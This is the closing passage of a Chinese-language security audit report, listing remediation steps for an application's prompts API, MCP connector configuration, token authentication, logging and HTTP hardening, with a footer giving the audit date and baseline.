4. 给 prompts API 加鉴权/前缀校验；MCP 连接器禁止用户提交 `command/args/env`，禁用用户 mcp.json 的 env 展开。
5. 鉴权中间件改 `verify_exp=True`，token 加 jti/短 TTL；移除 URL token 或改一次性签名，日志 query 脱敏。
6. 按要求补齐剩余 P2/P3（上传限制、SVG、HITL 策略、限流 429、审计覆盖、安全响应头）。

---

*报告完成时间：2026-10-17；审计基线 commit：工作树（含大量未提交改动），`git rev-parse HEAD` 未固定（只读审计未改动仓库）。*
